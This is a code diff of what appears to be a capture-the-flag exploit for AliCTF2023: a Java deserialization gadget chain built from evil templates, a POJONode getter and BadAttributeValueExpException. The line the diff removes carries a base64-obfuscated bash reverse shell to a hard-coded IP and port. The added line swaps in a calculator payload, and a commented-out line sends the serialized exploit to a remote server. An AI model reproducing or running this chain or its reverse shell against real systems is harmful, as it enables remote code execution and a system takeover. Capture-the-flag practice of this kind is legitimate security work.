@@ -13,16 +13,12 @@ import java.util.Base64;
 public class AliCTF2023Bypass {
 
     public static void task1() throws Exception {
-//        Object templates = STemplates.getEvilTemplates("calc");
-        Object templates = STemplates.getEvilTemplates("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}");
-
+        Object templates = STemplates.getEvilTemplates("calc");
         Object json = GPOJONode.toString2Getter(templates);
         Object poc = GBadAttributeValueExpException.deserialize2ToString(json);
-
         byte[] code = SerializeUtils.serialize(poc);
-        System.out.println(MiscUtils.base64Encode(code));
-
-//        SerializeUtils.deserialize(code);
+//        System.out.println(MiscUtils.base64Encode(code));
+        SerializeUtils.deserialize(code);
 //        MiscUtils.sendToServer("http://112.124.14.13:8070/bypassit", code);
     }
 
